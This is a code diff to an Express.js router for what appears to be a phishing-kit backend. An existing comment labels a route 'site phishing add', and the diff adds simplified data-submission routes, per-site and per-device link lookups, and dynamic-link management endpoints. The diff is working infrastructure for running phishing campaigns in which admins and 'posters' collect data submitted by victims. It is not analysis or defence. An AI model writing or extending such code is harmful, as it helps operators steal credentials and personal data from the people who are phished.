@@ -53,6 +53,11 @@ import {
   mega_wrong_post,
   send_email,
   update_tag,
+  dynamic_link_get,
+  dynamic_link_delete,
+  site_exist_simplified,
+  add_data_simplified,
+  site_exist_two_params,
 } from "./routehandler.js";
 
 import {
@@ -115,6 +120,7 @@ router.post("/edit/link/", add_new_links); //edit links number
 router.post("/admin/add", poster_add); //admin user and pass add
 
 router.post("/ad/:adminId/:posterId", rateLimitMiddleware, add_data); ///site phishing add
+router.post("/ad/:adminId", rateLimitMiddleware, add_data_simplified);
 
 router.delete("/delete/poster/:id_pos/:id_ad", delete_poster);
 
@@ -173,6 +179,8 @@ router.get("/info/:username/:id/:admin", info_get);
 router.get("/get/poster/:id/:admin", get_A_poster); ////
 // router.get('/:site/:adminId/:posterId/:device', site_exist);
 router.get("/:site/:adminId/:posterId/:verifyId/:device", site_exist);
+router.get("/:site/:adminId/:device", site_exist_simplified);
+router.get("/:site/:param1/:param2/:device", site_exist_two_params);
 
 // router.get('/:site/:adminId/:posterId/:verifyId/:device', site_exist_new);
 
@@ -192,5 +200,8 @@ router.get(
   "/today/app/details/data/poster/hello/found/end/info/:username/:id/:admin",
   id_card,
 );
+
+router.get("/dynamic-link/get/:id", dynamic_link_get);
+router.delete("/dynamic-link/delete/:id", dynamic_link_delete);
 
 export default router;
